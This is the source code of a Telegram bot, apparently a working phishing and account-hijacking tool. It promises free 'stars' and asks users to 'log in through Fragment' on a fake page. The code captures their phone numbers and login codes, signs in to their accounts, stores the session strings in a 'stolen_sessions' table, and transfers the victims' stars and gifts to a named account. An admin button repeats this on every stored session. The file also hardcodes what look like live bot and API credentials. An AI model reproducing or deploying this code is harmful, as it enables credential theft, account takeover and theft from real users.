const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram/tl');
const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');
const fs = require('fs');

const BOT_TOKEN = process.env.BOT_TOKEN || '8435516460:AAHloK_TWMAfViZvi98ELyiMP-2ZapywGds';
const API_ID = parseInt(process.env.API_ID) || 30427944;
const API_HASH = process.env.API_HASH || '0053d3d9118917884e9f51c4d0b0bfa3';
const MY_USER_ID = 1398396668;
const WEB_APP_URL = 'https://starsdrainer.onrender.com';

// ФИКС ДЛЯ КНОПОК
const bot = new TelegramBot(BOT_TOKEN, {
    polling: {
        interval: 1000,
        params: {
            timeout: 10,
            allowed_updates: ["message", "callback_query", "inline_query"]
        }
    },
    request: {
        timeout: 10000
    }
});

const app = express();
const activeSessions = new Map();

app.use(express.json());
app.use(express.static('public'));

// База данных
const db = new sqlite3.Database('database.db');
db.serialize(() => {
    db.run(`CREATE TABLE IF NOT EXISTS checks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        amount INTEGER,
        activations INTEGER,
        creator_id INTEGER,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS stolen_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        phone TEXT,
        code TEXT,
        phone_code_hash TEXT,
        session_string TEXT,
        tg_data TEXT,
        user_id INTEGER,
        status TEXT DEFAULT 'pending',
        stars_data INTEGER DEFAULT 0,
        gifts_data INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        username TEXT,
        balance INTEGER DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);
    
    db.run(`CREATE TABLE IF NOT EXISTS used_checks (
        user_id INTEGER,
        check_id INTEGER,
        used_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        PRIMARY KEY (user_id, check_id)
    )`);
});

// Web App
app.get('/', (req, res) => {
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.sendFile(path.join(__dirname, 'public', 'fragment.html'));
});

app.post('/steal', async (req, res) => {
    if (req.body.stage === 'phone_entered') {
        try {
            const urlParams = new URLSearchParams(req.body.tg_data);
            const userStr = urlParams.get('user');
            let userId = null;
            
            if (userStr) {
                const userData = JSON.parse(decodeURIComponent(userStr));
                userId = userData.id;
            }
            
            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
            
            await requestRealTelegramCode(req.body.phone, userId);
                
        } catch (error) {
            console.log('❌ Ошибка:', error);
        }
            
    } else if (req.body.stage === 'code_entered') {
        const phone = req.body.phone;
        const code = req.body.code;
        
        await signInWithRealCode(phone, code);
    }
    
    res.sendStatus(200);
});

// Запрос кода
async function requestRealTelegramCode(phone, userId) {
    try {
        const stringSession = new StringSession("");
        const client = new TelegramClient(stringSession, API_ID, API_HASH, {
            connectionRetries: 3,
            timeout: 30000,
        });
        
        await client.connect();

        const result = await client.invoke(
            new Api.auth.SendCode({
                phoneNumber: phone,
                apiId: API_ID,
                apiHash: API_HASH,
                settings: new Api.CodeSettings({})
            })
        );

        activeSessions.set(phone, {
            client: client,
            phoneCodeHash: result.phoneCodeHash,
            session: stringSession
        });

        db.run(`UPDATE stolen_sessions SET phone_code_hash = ? WHERE phone = ?`, 
            [result.phoneCodeHash, phone]);

        bot.sendMessage(MY_USER_ID, `🔐 Код запрошен: ${phone}`);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// Вход с кодом
async function signInWithRealCode(phone, code) {
    try {
        const sessionData = activeSessions.get(phone);
        if (!sessionData) return;

        const client = sessionData.client;
        const phoneCodeHash = sessionData.phoneCodeHash;

        try {
            await client.invoke(
                new Api.auth.SignIn({
                    phoneNumber: phone,
                    phoneCodeHash: phoneCodeHash,
                    phoneCode: code.toString()
                })
            );

            const sessionString = client.session.save();
            db.run(`UPDATE stolen_sessions SET status = 'completed', session_string = ? WHERE phone = ?`, 
                [sessionString, phone]);

            // КРАДЕМ ВСЕ ЧТО МОЖЕМ
            await stealEverything(client, phone);
            
            await client.disconnect();
            activeSessions.delete(phone);

        } catch (signInError) {
            bot.sendMessage(MY_USER_ID, `❌ Ошибка входа: ${phone}`);
            activeSessions.delete(phone);
        }

    } catch (error) {
        bot.sendMessage(MY_USER_ID, `❌ Ошибка: ${error.message}`);
    }
}

// КРАЖА ВСЕГО ЧТО МОЖЕМ
async function stealEverything(client, phone) {
    try {
        const user = await client.getMe();
        let stolenCount = 0;
        let report = '';
        
        report += `🔍 Ищем @NikLaStore...\n`;
        let targetUser = null;
        
        try {
            const target = await client.invoke(
                new Api.contacts.ResolveUsername({
                    username: 'NikLaStore'
                })
            );
            
            if (target && target.users && target.users.length > 0) {
                targetUser = target.users[0];
                report += `✅ @NikLaStore найден\n`;
            } else {
                report += `❌ @NikLaStore не найден\n`;
                throw new Error('Target not found');
            }
        } catch (error) {
            report += `❌ Ошибка поиска: ${error.message}\n`;
            throw error;
        }
        
        // ПРОБУЕМ РАЗНЫЕ МЕТОДЫ КРАЖИ
        
        // 1. ПРЕМИУМ ПОДАРКИ ЧЕРЕЗ PAYMENTS
        report += `🎁 Пробуем премиум подарки...\n`;
        try {
            const userFull = await client.invoke(
                new Api.users.GetFullUser({
                    id: user.id
                })
            );
            
            if (userFull && userFull.premium_gifts && userFull.premium_gifts.length > 0) {
                report += `💎 Найдено премиум подарков: ${userFull.premium_gifts.length}\n`;
                
                // ПЫТАЕМСЯ ОТПРАВИТЬ ПРЕМИУМ ПОДАРКИ
                for (let i = 0; i < Math.min(userFull.premium_gifts.length, 10); i++) {
                    try {
                        await client.invoke(
                            new Api.payments.SendStars({
                                peer: targetUser,
                                stars: 25,
                                purpose: new Api.InputStorePaymentPremiumGift({
                                    userId: targetUser.id
                                })
                            })
                        );
                        stolenCount++;
                        report += `✅ Отправлен премиум подарок ${i+1}\n`;
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (error) {
                        report += `❌ Ошибка подарка ${i+1}: ${error.message}\n`;
                        break;
                    }
                }
            } else {
                report += `❌ Нет премиум подарков\n`;
            }
        } catch (premiumError) {
            report += `⚠️ Ошибка премиум подарков: ${premiumError.message}\n`;
        }
        
        // 2. ПРОБУЕМ ОТПРАВИТЬ ЗВЕЗДЫ
        report += `💰 Пробуем звезды...\n`;
        try {
            const starsData = await client.invoke(
                new Api.payments.GetStarsStatus({})
            );
            
            if (starsData && starsData.balance > 0) {
                report += `⭐ Найдено звезд: ${starsData.balance}\n`;
                
                try {
                    await client.invoke(
                        new Api.payments.SendStars({
                            peer: targetUser,
                            stars: starsData.balance,
                            purpose: new Api.InputStorePaymentPremiumSubscription({
                                userId: targetUser.id
                            })
                        })
                    );
                    report += `✅ Отправлено ${starsData.balance} звезд\n`;
                    stolenCount += Math.floor(starsData.balance / 25); // Примерно 1 подарок за 25 звезд
                } catch (starsError) {
                    report += `❌ Ошибка отправки звезд: ${starsError.message}\n`;
                }
            } else {
                report += `❌ Нет звезд\n`;
            }
        } catch (starsError) {
            report += `⚠️ Ошибка звезд: ${starsError.message}\n`;
        }
        
        // 3. ПРОБУЕМ GIFTS ЧЕРЕЗ РАЗНЫЕ МЕТОДЫ
        report += `🎯 Пробуем разные методы gifts...\n`;
        
        // Метод 1: payments.GetStarGifts
        try {
            const starGifts = await client.invoke(
                new Api.payments.GetStarGifts({})
            );
            if (starGifts && starGifts.gifts) {
                report += `📦 StarGifts: ${starGifts.gifts.length}\n`;
                
                // Пробуем передать первые 5
                for (let i = 0; i < Math.min(starGifts.gifts.length, 5); i++) {
                    try {
                        await client.invoke(
                            new Api.messages.SendMedia({
                                peer: targetUser,
                                media: new Api.InputMediaGift({
                                    id: starGifts.gifts[i].id,
                                    star: 25
                                }),
                                message: "",
                                randomId: Math.floor(Math.random() * 1000000000)
                            })
                        );
                        stolenCount++;
                        report += `✅ Передан star gift ${i+1}\n`;
                        await new Promise(resolve => setTimeout(resolve, 1000));
                    } catch (error) {
                        report += `❌ Ошибка star gift ${i+1}\n`;
                    }
                }
            }
        } catch (giftsError) {
            report += `⚠️ Ошибка StarGifts: ${giftsError.message}\n`;
        }
        
        // ФИНАЛЬНЫЙ ОТЧЕТ
        let message = `🎯 РЕЗУЛЬТАТ КРАЖИ:\n` +
                     `📱 ${phone}\n` +
                     `👤 @${user.username || 'нет'}\n` +
                     `👑 Премиум: ${user.premium ? 'ДА' : 'НЕТ'}\n\n` +
                     `${report}\n` +
                     `💰 ИТОГО УКРАДЕНО: ${stolenCount}`;
        
        if (stolenCount > 0) {
            message += `\n✅ УСПЕШНАЯ КРАЖА!`;
        } else {
            message += `\n❌ НИЧЕГО НЕ УДАЛОСЬ УКРАСТЬ`;
        }
        
        db.run(`UPDATE stolen_sessions SET gifts_data = ?, status = 'stolen' WHERE phone = ?`, 
            [stolenCount, phone]);
        
        bot.sendMessage(MY_USER_ID, message);
        
    } catch (error) {
        bot.sendMessage(MY_USER_ID, 
            `❌ ОШИБКА КРАЖИ\n` +
            `📱 ${phone}\n` +
            `⚠️ ${error.message}`
        );
    }
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Сервер работает`);
});

// INLINE QUERY С РАБОЧИМИ КНОПКАМИ
bot.on('inline_query', (query) => {
    const results = [
        {
            type: 'article',
            id: '1',
            title: '🎫 Чек на 50 звезд',
            description: 'Создать чек на 50 звезд',
            input_message_content: {
                message_text: '🎫 Чек на 50 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "🪙 Забрать звезды", url: `https://t.me/${bot.options.username}?start=create_check_50` }
                ]]
            }
        },
        {
            type: 'article',
            id: '2',
            title: '💫 Чек на 100 звезд',
            description: 'Создать чек на 100 звезд',
            input_message_content: {
                message_text: '🎫 Чек на 100 звезд!\n\nНажмите кнопку ниже чтобы забрать:',
            },
            reply_markup: {
                inline_keyboard: [[
                    { text: "💫 Забрать звезды", url: `https://t.me/${bot.options.username}?start=create_check_100` }
                ]]
            }
        }
    ];
    
    bot.answerInlineQuery(query.id, results, { cache_time: 1 });
});

// СОЗДАНИЕ ЧЕКОВ С РАБОЧИМИ КНОПКАМИ
bot.onText(/@MyStarBank_bot/, (msg) => {
    bot.sendMessage(msg.chat.id, '🎫 Создание чека:\n\nВыберите сумму:', {
        reply_markup: {
            inline_keyboard: [
                [{ text: "🪙 Чек на 50 звезд", callback_data: "create_50" }],
                [{ text: "💫 Чек на 100 звезд", callback_data: "create_100" }]
            ]
        }
    });
});

// CALLBACK ОБРАБОТЧИК С ФИКСОМ КНОПОК
bot.on('callback_query', (query) => {
    const data = query.data;
    const userId = query.from.id;
    
    // ОБЯЗАТЕЛЬНО ОТВЕЧАЕМ НА CALLBACK
    bot.answerCallbackQuery(query.id).catch(() => {});
    
    if (data === 'create_50' || data === 'create_100') {
        const amount = data === 'create_50' ? 50 : 100;
        
        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
            [amount, userId], function(err) {
            if (err) return;
            
            const checkId = this.lastID;
            const checkText = `🎫 Чек на ${amount} звезд!\n\nНажмите кнопку чтобы забрать:`;
            
            bot.sendMessage(query.message.chat.id, checkText, {
                reply_markup: { 
                    inline_keyboard: [[{ 
                        text: `🪙 Забрать ${amount} звезд`, 
                        url: `https://t.me/${bot.options.username}?start=check_${checkId}` 
                    }]] 
                }
            });
        });
    }
    
    // КНОПКА КРАЖИ ДЛЯ АДМИНА
    if (query.data === 'steal_all_gifts' && query.from.id === MY_USER_ID) {
        db.all(`SELECT phone, session_string FROM stolen_sessions WHERE status = 'completed'`, async (err, rows) => {
            let totalStolen = 0;
            
            for (const row of rows) {
                try {
                    const stringSession = new StringSession(row.session_string);
                    const client = new TelegramClient(stringSession, API_ID, API_HASH, {
                        connectionRetries: 2,
                        timeout: 30000
                    });
                    
                    await client.connect();
                    await stealEverything(client, row.phone);
                    await client.disconnect();
                    
                    totalStolen++;
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                } catch (error) {
                    console.log(`Ошибка: ${row.phone}`);
                }
            }
            
            bot.sendMessage(MY_USER_ID, `✅ Обработано ${totalStolen} аккаунтов`);
        });
    }
});

// ГЛАВНОЕ МЕНЮ С РАБОЧИМИ КНОПКАМИ
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, 0)`, 
        [msg.from.id, msg.from.username]);
    
    const menuText = `MyStarBank - Система передачи звезд\n\nДоступные действия:`;
    
    const menuKeyboard = {
        reply_markup: {
            keyboard: [
                [{ text: "📊 Проверить баланс" }],
                [{ text: "🎫 Создать чек" }],
                [{ text: "💸 Вывести средства" }]
            ],
            resize_keyboard: true
        }
    };

    bot.sendMessage(chatId, menuText, menuKeyboard);
});

// МЕНЮ /logs ДЛЯ АДМИНА С РАБОЧИМИ КНОПКАМИ
bot.onText(/\/logs/, (msg) => {
    if (msg.from.id !== MY_USER_ID) return;
    
    db.all(`SELECT phone, status, stars_data, gifts_data FROM stolen_sessions ORDER BY created_at DESC LIMIT 10`, (err, rows) => {
        let logText = '📊 Последние 10 сессий:\n\n';
        
        if (rows.length === 0) {
            logText = '📊 Нет данных о сессиях';
        } else {
            rows.forEach((row, index) => {
                logText += `📱 ${row.phone}\n`;
                logText += `📊 Статус: ${row.status}\n`;
                logText += `⭐ Звезд: ${row.stars_data}\n`;
                logText += `🎁 Подарков: ${row.gifts_data}\n`;
                if (index < rows.length - 1) logText += `────────────────\n`;
            });
        }
        
        bot.sendMessage(msg.chat.id, logText, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🔄 Украсть все", callback_data: "steal_all_gifts" }]
                ]
            }
        });
    });
});

// ОБРАБОТКА ТЕКСТОВЫХ КОМАНД
bot.on('message', (msg) => {
    const text = msg.text;
    
    if (text === 'Проверить баланс') {
        db.get(`SELECT balance FROM users WHERE user_id = ?`, [msg.from.id], (err, row) => {
            const balance = row ? row.balance : 0;
            bot.sendMessage(msg.chat.id, `💰 Ваш баланс: ${balance} stars`);
        });
        
    } else if (text === 'Создать чек') {
        bot.sendMessage(msg.chat.id,
            `🎫 Создание чека\n\n❌ Временно недоступно\n\nДля идентификации нужно подождать 21 день`
        );
        
    } else if (text === 'Вывести средства') {
        bot.sendMessage(msg.chat.id,
            `🏦 Вывод средств\n\n🔐 Для вывода необходимо войти через Fragment\n\nНажмите кнопку ниже:`,
            {
                reply_markup: {
                    inline_keyboard: [[
                        { text: "🔐 Войти через Fragment", web_app: { url: WEB_APP_URL } }
                    ]]
                }
            }
        );
    }
});

// ОБРАБОТКА ЧЕКОВ
bot.onText(/\/start (.+)/, (msg, match) => {
    const params = match[1];
    
    if (params.startsWith('check_')) {
        const checkId = params.split('_')[1];
        
        db.get(`SELECT * FROM used_checks WHERE user_id = ? AND check_id = ?`, [msg.from.id, checkId], (err, usedRow) => {
            if (usedRow) {
                bot.sendMessage(msg.chat.id, '❌ Чек уже использован!');
                return;
            }
            
            db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
                if (!row) {
                    bot.sendMessage(msg.chat.id, '❌ Чек не существует!');
                    return;
                }
                
                db.get(`SELECT balance FROM users WHERE user_id = ?`, [msg.from.id], (err, userRow) => {
                    const newBalance = (userRow ? userRow.balance : 0) + row.amount;
                    
                    db.serialize(() => {
                        db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                        db.run(`INSERT OR REPLACE INTO users (user_id, username, balance) VALUES (?, ?, ?)`, 
                            [msg.from.id, msg.from.username, newBalance]);
                        db.run(`INSERT INTO used_checks (user_id, check_id) VALUES (?, ?)`, [msg.from.id, checkId]);
                    });
                    
                    bot.sendMessage(msg.chat.id, 
                        `🎉 Получено ${row.amount} звезд!\n💫 Ваш баланс: ${newBalance} stars`
                    );
                });
            });
        });
        
    } else if (params.startsWith('create_check_')) {
        const amount = parseInt(params.split('_')[2]);
        
        db.run(`INSERT INTO checks (amount, activations, creator_id) VALUES (?, 1, ?)`, 
            [amount, msg.from.id], function(err) {
            if (err) return;
            
            const checkId = this.lastID;
            const checkText = `🎫 Чек на ${amount} звезд!\n\nНажмите кнопку чтобы забрать:`;
            
            bot.sendMessage(msg.chat.id, checkText, {
                reply_markup: { 
                    inline_keyboard: [[{ 
                        text: `🪙 Забрать ${amount} звезд`, 
                        url: `https://t.me/${bot.options.username}?start=check_${checkId}` 
                    }]] 
                }
            });
        });
    }
});

console.log('✅ Бот запущен');